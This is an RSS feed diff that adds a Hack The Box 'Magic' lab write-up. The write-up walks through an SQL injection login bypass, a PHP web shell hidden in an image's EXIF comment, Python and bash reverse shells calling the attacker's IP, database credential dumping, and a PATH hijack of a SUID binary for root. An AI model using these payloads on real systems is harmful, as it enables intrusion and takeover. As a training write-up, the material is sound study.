@@ -8,6 +8,194 @@
     <lastBuildDate>Fri, 09 Apr 2021 13:32:05 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/mysqldump/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>HackTheBox - Magic</title>
+      <link>https://fahmifj.github.io/hackthebox/magic/</link>
+      <pubDate>Fri, 09 Apr 2021 13:32:05 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/magic/</guid>
+      <description>SQLi for login bypass and embed webshell to an image file</description>
+      <content:encoded><![CDATA[<p>Magic from Hack The Box features a PHP-based web application which is vulnerable to SQL injection for login bypass. Embedding a web shell payload to a valid image file and adding a <code>.php</code> extension to it can bypass the upload filter, and this allows me to have a code execution on the system. Enumerating the systems discovers database credentials, and the credentials are used to retrieve another credentials from the database which is reused by the user. For the root part, there&rsquo;s a SUID binary that calls other binaries without their absolute path. This allows me to perform a path hijack attack and gain root access.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>SQL injection</li>
+<li>Bypassing Upload Filter</li>
+<li>SUID exploitation</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li>Exiftool - <a href="https://exiftool.org/">https://exiftool.org/</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «magic» «10.10.14.169»
+$ nmap -sC -sV -oA scans/magic 10.10.10.185
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey:
+<span class="p">|</span>   <span class="m">2048</span> 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: Magic Portfolio
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p><code>nmap</code> found two ports open, an HTTP service on port 80 and SSH service on port 22</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80  -  Website</h3>
+<p>The home page shows a bunch of images.</p>
+<p><img src="imgs/image-20210413132328926.png" alt="image-20210413132328926" style="zoom:80%;" /></p>
+<p>By clicking &ldquo;Views image&rdquo;, I know some images located on <code>/images/uploads</code> and some others on <code>/images/fulls</code>. At the bottom page, there&rsquo;s a login button that points to <code>/login.php</code></p>
+<p><img src="imgs/image-20210412052815532.png" alt="image-20210412052815532" style="zoom: 80%;" /></p>
+<p>Common credentials don&rsquo;t seem to work here.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="sql-injection---login-bypass-on-loginphp">SQL injection - Login bypass on <code>/login.php</code></h4>
+<blockquote>
+<p>The login form doesn&rsquo;t allows spacing between character, but it can be tricked by copy and paste.</p>
+</blockquote>
+<p>A basic sql injection technique <code>' or 1 = 1 -- - </code>  to bypass login is work against the login page.</p>
+<blockquote>
+<p>In MySQL, a space after a comment is a must <code>-- [space]</code>, because of that I added <code>-- -</code> to make it clear.</p>
+</blockquote>
+<p>We can assume the back-end query would look like this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="p">...</span><span class="o">&lt;</span><span class="k">some</span><span class="w"> </span><span class="n">php</span><span class="o">&gt;</span><span class="p">...</span><span class="w">
+</span><span class="w"></span><span class="err">$</span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span><span class="w">
+</span><span class="w"></span><span class="err">$</span><span class="n">pwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span><span class="w">
+</span><span class="w"></span><span class="p">...</span><span class="o">&lt;</span><span class="k">some</span><span class="w"> </span><span class="n">php</span><span class="o">&gt;</span><span class="p">...</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">table</span><span class="p">.</span><span class="k">user</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;$username&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;$pwd&#39;</span><span class="w">
+</span></code></pre></div><p>If I assign <code>' or 1 = 1 -- - </code> as value of <code>$username</code>, it becomes:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">table</span><span class="p">.</span><span class="k">user</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="c1">-- -&#39; and password=&#39;$pwd&#39;
+</span></code></pre></div><h4 id="upload-filter-bypass">Upload filter bypass</h4>
+<p>Upon a successful login, the site redirects me to <code>/upload.php</code>. It shows up with an upload form. It only accepts a valid image file.</p>
+<p><img src="imgs/image-20210413153556151.png" alt="image-20210413153556151" style="zoom:80%;" /></p>
+<p>After some testing, I can bypass this upload filter by embedding my php shell on an image file (I took it from the web itself). This can be done by using <code>exiftool</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «forest» «10.10.14.169»
+$ ./exiftool -Comment<span class="o">=</span><span class="s1">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> iamf.jpg
+</code></pre></div><p>Next, I added <code>.php</code> extension right before the image extension (in my case it is <code>.jpg</code>, so it becomes <code>filename.php.jpg</code>).</p>
+<p>Back to <code>/upload.php</code>, now it accepts my malicious image.</p>
+<p><img src="imgs/image-20210413153504323.png" alt="image-20210413153504323" style="zoom:80%;" /></p>
+<p>I can find the uploaded file at <code>http://htb.magic/images/uploads/</code>.</p>
+<p>When I visit <code>http://htb.magic/images/uploads/iamf.php.jpg?cmd=pwd</code>, I can see the code execution is working</p>
+<p><img src="https://cdn-images-1.medium.com/max/1000/1*WJEvgyrM5UmXULt8uBhu3A.png" alt="img" style="zoom:80%;" /></p>
+<h4 id="shell-access">Shell access</h4>
+<p>The machine has Python3 installed. With that, I can send a Python one liner reverse shell and set up a listener on port 443 to gain a foothold on the system.</p>
+<p>I&rsquo;ll enter this URL on the browser.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">http://htb.magic/images/uploads/iamf.php.jpg?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.169%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27&#34;
+</span></code></pre></div><p>When I check my listener:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «magic» «10.10.14.169»
+$ nc -nvlp <span class="m">443</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
+connect to <span class="o">[</span>10.10.14.169<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.185<span class="o">]</span> <span class="m">19448</span>
+bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1327<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+bash: no job control in this shell
+$ id
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-theseus">Shell as theseus</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>There is a database configuration, <code>db.php5</code>, that stores database credentials.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ find . -type f -user www-data
+
+...&lt;SNIP&gt;...
+./var/www/Magic/db.php5
+...&lt;SNIP&gt;...
+</code></pre></div><p><img src="imgs/image-20210413153535228.png" alt="image-20210413153535228" style="zoom:80%;" /></p>
+<h4 id="database-dump">Database dump</h4>
+<p>I can use <code>netstat</code> to confirm that the MySQL server is currently running.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@ubuntu:/var/www/Magic$ netstat -tlpn
+
+...&lt;SNIP&gt;...
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+...&lt;SNIP&gt;...
+tcp		0		<span class="m">0</span>   127.0.0.1:3306           0.0.0.0:*              LISTEN       -
+...&lt;SNIP&gt;...
+</code></pre></div><p>Unfortunately, the <code>mysql</code> binary is not present in this box.</p>
+<p><img src="imgs/image-20210413153425371.png" alt="image-20210413153425371"  /></p>
+<p>But, I could use <code>mysqldump</code> to dump the database, and it contains another credentials: <code>admin:Th3s3usW4sK1ng</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@ubuntu:/var/www/Magic$ mysqldump Magic -u theseus -p<span class="s1">&#39;iamkingtheseus&#39;</span>
+
+...&lt;SNIP&gt;...
+LOCK TABLES <span class="sb">`</span>login<span class="sb">`</span> WRITE<span class="p">;</span>
+/*!40000 ALTER TABLE <span class="sb">`</span>login<span class="sb">`</span> DISABLE KEYS */<span class="p">;</span>
+INSERT INTO <span class="sb">`</span>login<span class="sb">`</span> VALUES <span class="o">(</span>1,<span class="s1">&#39;admin&#39;</span>,<span class="s1">&#39;Th3s3usW4sK1ng&#39;</span><span class="o">)</span><span class="p">;</span>
+/*!40000 ALTER TABLE <span class="sb">`</span>login<span class="sb">`</span> ENABLE KEYS */<span class="p">;</span>
+UNLOCK TABLES<span class="p">;</span>                                           
+/*!40103 SET <span class="nv">TIME_ZONE</span><span class="o">=</span>@OLD_TIME_ZONE */<span class="p">;</span>
+...&lt;SNIP&gt;...
+</code></pre></div><h4 id="shell-upgrade-to-ssh">Shell upgrade to SSH</h4>
+<p>It turns out that the password <code>Th3s3usW4sK1ng</code> is reused by user <strong>theseus</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@ubuntu:/var/www/Magic$ su theseus
+Password: 
+theseus@ubuntu:/var/www/Magic$
+</code></pre></div><p>Before enumeration, I would like to switch to SSH. First, I&rsquo;ll generate a new SSH key.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «magic» «10.10.14.169»
+$ ssh-keygen -f theseus 
+</code></pre></div><p>Then, I&rsquo;ll add the newly generated public key to <strong>theseus</strong>&rsquo;s <code>authorized_keys</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">theseus@ubuntu:~/.ssh$ <span class="nb">echo</span> <span class="s1">&#39;ssh-rsa AAABBBCCCDDD&#39;</span> &gt;&gt; authorized_keys
+</code></pre></div><p>Now I can log in via SSH.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «magic» «10.10.14.169»
+$ ssh -i  theseus@10.10.10.185
+...&lt;SNIP&gt;...
+theseus@ubuntu:~$ id
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>theseus<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>theseus<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>100<span class="o">(</span>users<span class="o">)</span>,1000<span class="o">(</span>theseus<span class="o">)</span>
+</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-2">Enumeration</h4>
+<p>Upon enumerating for SUID, there&rsquo;s a binary that doesn&rsquo;t seem to be a common SUID on Ubuntu called <code>sysinfo</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">theseus@ubuntu:~$ find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
+</code></pre></div><p><img src="imgs/image-20210413153352652.png" alt="image-20210413153352652" style="zoom: 67%;" /></p>
+<p>The <code>sysinfo</code> binary is owned by root, but it can be executed by the <code>users</code> group and <code>theseus</code> is a member of that group.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">theseus@ubuntu:~$ ls -las /bin <span class="p">|</span> grep sysinfo
+ <span class="m">24</span> -rwsr-x--- <span class="m">1</span> root users <span class="m">22040</span> Oct <span class="m">21</span> <span class="m">2019</span> sysinfo
+</code></pre></div><p>When I execute the binary and it returns some hardware information on the screen that looks similar to what <code>lshw</code>, <code>free</code> and other binary related to hardware info produces.</p>
+<p><img src="imgs/image-20210413153311827.png" alt="image-20210413153311827" style="zoom:80%;" /></p>
+<p>A quick search on Google shows:</p>
+<p><img src="imgs/image-20210413153328164.png" alt="image-20210413153328164" style="zoom:80%;" /></p>
+<p>So it is the same header.</p>
+<p>Running <code>strings</code> against <code>sysinfo</code> reveals it calls <code>lshw</code>, <code>free</code>, <code>fdisk</code> and some other bins without their absolute path. (I don&rsquo;t have the screenshots to show what it looks like, also can&rsquo;t find the logs on my notes, sorry)</p>
+<ul>
+<li>Absolute path: <code>/bin/sysinfo</code> &ndash;&gt; fixed path, can not be modified except global write access is permitted. (cmiiw)</li>
+<li>Relative path: <code>sysinfo</code> &ndash;&gt; resolved by user&rsquo;s environment, the path follows user&rsquo;s <code>$PWD</code>.</li>
+</ul>
+<h4 id="path-hijack-on-suid">Path Hijack on SUID</h4>
+<p>Knowing the SUID binary uses relative path to call other binaries, I can abuse this by creating, for example, a fake <code>lshw</code> binary that contains a reverse shell.</p>
+<p>First thing to do is, I will create a fake <code>lshw</code> in <code>/tmp/iamf</code> folder and append one liner bash reverse shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">theseus@ubuntu:/tmp$ mkdir iamf
+theseus@ubuntu:/tmp$ which lshw
+/bin/lshw
+</code></pre></div><p>Next, I’ll export <code>/tmp/iamf</code> to the environment variable <code>$PATH</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">theseus@ubuntu:/tmp$ <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/sh bash -i &gt;&amp; /dev/tcp/10.10.10.169/1234 0&gt;&amp;1&#39;</span> &gt; iamf/lshw
+theseus@ubuntu:/tmp$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/tmp/iamf:<span class="nv">$PATH</span>
+</code></pre></div><p>Now If I call <code>lshw</code>, the OS will resolve it to the one on <code>/tmp/iamf</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">theseus@ubuntu:/tmp$ which lshw
+/tmp/iamf/lshw
+</code></pre></div><p>After that, I can just execute the <code>sysinfo</code> binary. However, it then just hangs.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">theseus@ubuntu:/tmp$ <span class="nv">sysinfo</span>
+<span class="o">====================</span>Hardware <span class="nv">Info</span><span class="o">====================</span>
+</code></pre></div><p>That is because its execution is interrupted by the reverse shell. I&rsquo;m rooted now.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «magic» «10.10.14.169»
+$ nc -nvlp <span class="m">1234</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+connect to <span class="o">[</span>10.10.14.169<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.185<span class="o">]</span> <span class="m">36094</span>
+root@ubuntu:/tmp/iamf# id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,100<span class="o">(</span>users<span class="o">)</span>,1000<span class="o">(</span>theseus<span class="o">)</span>
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210413152136238.png" alt="image-20210413152136238"  /></div>
+</p>
+<hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://portswigger.net/support/using-sql-injection-to-bypass-authentication">https://portswigger.net/support/using-sql-injection-to-bypass-authentication</a></li>
+<li><a href="https://exiftool.org/">https://exiftool.org/</a></li>
+<li><a href="https://github.com/xapax/security/blob/master/bypass_image_upload.md">https://github.com/xapax/security/blob/master/bypass_image_upload.md</a></li>
+<li><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Magic</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-magic/</link>
       <pubDate>Fri, 09 Apr 2021 13:32:05 +0700</pubDate>
       
